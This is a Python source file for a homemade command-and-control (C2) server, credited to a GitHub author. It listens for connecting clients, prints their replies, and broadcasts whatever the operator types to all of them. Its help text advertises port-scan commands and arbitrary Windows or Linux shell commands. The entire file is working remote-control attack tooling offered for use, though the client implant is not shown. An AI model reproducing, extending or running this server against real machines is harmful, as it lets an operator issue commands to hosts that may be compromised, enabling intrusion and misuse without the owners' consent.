# ==================================================================================================================== #
# Version 1.2.0 of my C2 Server!                                                                                       #
# Made by Eric E. Github: https://github.com/EricEsquivel                                                              #
# ==================================================================================================================== #

import socket
import sys
import threading
import time


def usage():
    print("""
    usage: server.py <ip> <port>
    """)
    sys.exit()


def start(cmdaddress):
    s.listen()
    print(f"Server is listening on: {cmdaddress}")
    while True:
        connection, address = s.accept()
        thread = threading.Thread(target=handle_clients, args=(connection, address))
        thread.start()
        thread_list.append(thread)
        listen_thread = threading.Thread(target=receive_info, args=(connection, address))
        listen_thread.start()
        thread_recv_list.append(listen_thread)
        print(f"Active connections: {threading.active_count() - 2}")
        print("Type 'help' for a list of commands")


def receive_info(connection, address):
    try: # Figure out how to make this not throw errors when "stopall" is entered without using try and except
        while True:
            for everythread in thread_list:
                client_connected_info = connection.recv(1024).decode("utf-8")
                print(client_connected_info)
    except:
        pass


def handle_clients(connection, address):
    try:
        print(f"Client {address} connected")
        sending()
        print("Stopping connections")
        for thread in thread_list:
            connection = thread._args[0]
            connection.close()
            thread_list.remove(threading.current_thread())   
        print("All connections disconnected. Keep terminal open to continue listening. Close terminal to exit.")
    except KeyboardInterrupt:
        sys.exit()


def broadcast(command):
    command = command.encode("utf-8")
    for thread in thread_list:
        connection = thread._args[0]
        connection.send(command)


def sending():
    command = ''
    while command != "stopall":
        command = input(">> ")
        if command == "help":
            print("""
            Custom commands: 'portscan' 'openports'
            Can also run normal windows/linux commands
            Use 'stopall' to disconnect clients
            """)
            continue
        else:
            broadcast(command)


# Run checks for args
if len(sys.argv) == 1:
    print("Missing arguments. Looking for ip and port")
    usage()
elif len(sys.argv) == 2:
    if sys.argv[1] == "help" or sys.argv[1] == "-h" or sys.argv[1] == "--help":
        usage()
        sys.exit()
    print("Missing arguments. Looking for a port")
    usage()
elif len(sys.argv) > 3:
    print("Too many arguments!")
    usage()
else:
    pass

cmdserver_ip = sys.argv[1]
try:
    cmdserver_port = int(sys.argv[2])
    if cmdserver_port not in range(1,65536):
        raise Exception
except ValueError:
    print("Port given is not an integer")
    usage()
except:
    print("Port given is not in range!")
    usage()

# Final check
cmdaddress = (cmdserver_ip,cmdserver_port)
s = socket.socket()
try:
    s.bind(cmdaddress)
except socket.gaierror:
    print("Invalid address given")
    usage()


thread_list = []
thread_recv_list = []

# Once checks are done, start connection
start(cmdaddress)